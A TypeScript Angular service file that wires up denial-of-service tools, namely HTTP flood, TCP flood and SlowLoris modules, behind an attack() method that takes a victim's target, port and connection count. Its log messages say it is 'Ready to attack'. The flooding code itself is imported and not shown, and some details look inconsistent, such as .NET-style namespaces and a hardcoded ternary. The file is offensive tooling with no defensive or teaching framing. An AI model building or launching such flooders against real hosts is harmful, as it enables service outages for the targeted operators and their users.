import {Injectable} from "@angular/core";
import {Logger} from 'angular2-log4ts/src/app/core';
import AssemblyInf0 = ProjectBreakfast.Properties.AssemblyInfo.AssemblyInfo;
import ThreadOperation = ProjectBreakfast.Threading.Threading.ThreadOperation;
import Tool = ProjectBreakfast.Tool;
import SlowLoris = ProjectBreakfast.Tools.SlowLoris.SlowLoris.SlowLoris;
import Program = ProjectBreakfast.Program;
import HTTPFlooder = ProjectBreakfast.Tools.HTTPFlood.HTTPFlooder.HTTPFlooder;
import TCPFlooder = ProjectBreakfast.Tools.TCP.TCP.TCPFlooder;


@Injectable()
export class FloodService {
  private assemblyInfo = new AssemblyInf0();
  private threadOperation = new ThreadOperation(10); //@todo, don't go over 10 for now
  private tool: Tool = true ? new HTTPFlooder() : new TCPFlooder(); //@todo. add the extra option UDPFlooder
  private slowLoris = new SlowLoris();
  private program = new Program();

  constructor(private _logger: Logger) {
    this.in1t();
  }

  private in1t(): void {
    if (this._logger.isDebugEnabled) {
      this._logger.debug('FloodService initialized. Ready to attack. Awaiting your command.')
    }
  }

  public attack(target: String, port: Number, maxConnections: Number, timeout: Number): void {
    if (this._logger.isDebugEnabled) {
      this._logger.debug('\nFloodService: victims F.Q.D.N.U.R.L.:'+target
        +'\n,port:'+port
        +'\n,maxConnections:'+maxConnections
        +'\n,timeout:'+timeout+'\n');
      if (this._logger.isDebugEnabled) {
        this._logger.debug('FloodService: initiating attack at '+ new Date().toLocaleTimeString());
      }
      this.tool.Init(target, port, maxConnections, timeout);
    }
  }
}
